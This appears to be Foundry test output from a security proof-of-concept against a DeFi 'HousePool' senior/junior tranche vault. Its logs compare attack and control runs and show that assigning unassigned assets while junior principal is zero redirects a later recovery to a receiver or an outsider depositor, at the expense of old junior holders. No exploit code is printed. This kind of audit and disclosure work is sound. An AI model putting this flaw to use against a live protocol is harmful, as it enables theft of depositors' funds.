[PASS] test_outsiderDepositAfterAssignment_capturesRecovery() (gas: 5666131)
Logs:
  ===== stage 1: mark 0.40, settleLpEpoch reconciles the loss =====
    seniorPrincipal       37636836803114
    juniorPrincipal       0
    unassignedAssets      0
    junior share supply   10006665431847178
  ===== stage 2: owner recaps the gap, mark drifts to 0.41, settleLpEpoch =====
    seniorPrincipal       39000709428377
    juniorPrincipal       0
    unassignedAssets      190000000000
    junior share supply   10006665431847178
    recap amount (gap)    1363874625263
  === OUTSIDER: unprivileged deposit after the assignment (raw 6-dec USDG) ===
    Junior principal when the deposit activates  190000000000
    outsider deposit                              1000000000000
    outsider share fraction at entry (1e18)       840587655180261573
    Junior principal after the reversion          12399287753960
    outsider claimable value after the reversion  10422688219007
    outsider profit on paper                      9422688219007
    receiver claimable value                      1976599534943
    old Junior holder value  attack/control       10 11209998879746
    outsider redeemed in cash (raw)               1999942548740
    outsider wallet before deposit / after cash   10000000000000 10999942548740

[PASS] test_seniorAssignmentReverts_noAlternative() (gas: 2563030)
Logs:
  ===== stage 1: mark 0.40, settleLpEpoch reconciles the loss =====
    seniorPrincipal       37636836803114
    juniorPrincipal       0
    unassignedAssets      0
    junior share supply   10006665431847178
  ===== stage 2: owner recaps the gap, mark drifts to 0.41, settleLpEpoch =====
    seniorPrincipal       39000709428377
    juniorPrincipal       0
    unassignedAssets      190000000000
    junior share supply   10006665431847178
    recap amount (gap)    1363874625263
  Senior deposit capacity at J = 0: 0
  assignUnassignedAssets(true, R) reverted: HousePool__ExceedsSeniorDepositCapacity

[PASS] test_unassignedBlocksDeposits() (gas: 5858551)
Logs:
  ===== stage 1: mark 0.40, settleLpEpoch reconciles the loss =====
    seniorPrincipal       37636836803114
    juniorPrincipal       0
    unassignedAssets      0
    junior share supply   10006665431847178
  ===== stage 2: owner recaps the gap, mark drifts to 0.41, settleLpEpoch =====
    seniorPrincipal       39000709428377
    juniorPrincipal       0
    unassignedAssets      190000000000
    junior share supply   10006665431847178
    recap amount (gap)    1363874625263
  (a) J=0, U>0: Junior request -> TerminallyWiped; Senior request -> DepositsUnavailable
  (b) J>0, S=H, U>0: both requests -> DepositsUnavailable (U is the only blocker)
      Senior capacity while blocked (raw) 999292472687
      Senior capacity after assignment (raw) 999292373751
  (c) after assignment: Junior and Senior requests accepted

[PASS] test_variant_tenPercentMoves_redirectsRecovery() (gas: 23592744)
Logs:
  === VARIANT: realized 10% rounds === 5
    projected Junior before the final move (raw) 1258325292769
    final LONG notional at 1.00 (raw)            15688816938121
  ===== variant: mark 0.90, settleLpEpoch =====
    seniorPrincipal       38689446881686
    juniorPrincipal       0
    unassignedAssets      0
    junior share supply   10006665431847178
  ===== variant: gap recap + drift to 0.901 =====
    seniorPrincipal       39000709428376
    juniorPrincipal       0
    unassignedAssets      15688800000
    junior share supply   10006665431847178
  ===== VARIANT ATTACK: assign at J = 0, mark reverts to 1.00 =====
    seniorPrincipal / HWM               39001063500284 39001063500284
    juniorPrincipal                     1568523928074
    unassignedAssets                    0
    junior supply / receiver shares     156992572637186360438247178 156992572627179695006400000
    receiver share fraction (1e18)      999999999936260262
    old Junior holder claimable value   99
    receiver claimable value            1568523927975
  ===== VARIANT CONTROL: no assignment =====
    seniorPrincipal / HWM               39000707428376 39000707428376
    juniorPrincipal                     1553191200000
    unassignedAssets                    15688800000
    junior supply / receiver shares     10006665431847178 0
    receiver share fraction (1e18)      0
    old Junior holder claimable value   1553191044785
    receiver claimable value            0
    old holder value before the final move (raw) 1258325167021
    U (raw)                                      15688800000
    old Junior holder loss vs control (raw)      1553191044686

Suite result: ok. 8 passed; 0 failed; 0 skipped; finished in 57.73ms (118.33ms CPU time)
```
